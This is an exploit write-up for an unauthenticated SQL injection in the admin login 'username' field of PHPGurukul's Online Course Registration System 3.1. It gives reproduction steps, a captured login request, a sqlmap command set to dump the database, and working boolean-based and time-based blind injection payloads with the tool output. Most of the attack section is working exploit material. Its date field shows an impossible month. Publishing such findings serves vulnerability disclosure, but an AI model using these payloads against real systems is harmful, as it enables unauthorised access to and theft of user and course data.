# Online Course Registration System - SQL Injection - 1 (Unauthenticated)
+ **Exploit Title:** Online Course Registration System - SQL Injection - 1 (Unauthenticated)
+ **Date:** 2024-17-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://phpgurukul.com/online-course-registration-free-download/
+ **Software Link:** https://phpgurukul.com/?sdm_process_download=1&download_id=7515
+ **Version:** 3.1
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Online Course Registration System allows SQL Injection via the 'username' parameter at "http://localhost/onlinecourse/admin/". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/onlinecourse/admin/"
+ Try logging in by typing random things
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
POST /onlinecourse/admin/index.php HTTP/1.1
Host: localhost
Content-Length: 35
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/onlinecourse/admin/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=gjt4nlgufp0uq0eep225bjaqoa
Connection: close

username=test&password=test&submit=

```

+ Use sqlmap to exploit. In sqlmap, use 'username' parameter to dump the database.
```
sqlmap -r r.txt -p username --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-6622' OR 9595=9595-- PTaA&password=test&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 7548 FROM (SELECT(SLEEP(5)))vOsB)-- aJtj&password=test&submit=
---
[19:45:50] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:45:50] [INFO] fetching current database             
current database: 'onlinecourse'
```
+ current database: `onlinecourse`

![Ekran görüntüsü 2024-05-16 130355](https://github.com/BurakSevben/CVEs/assets/117217689/4fe9f9c7-edf1-4e06-8ff5-1014c98f4ba7)
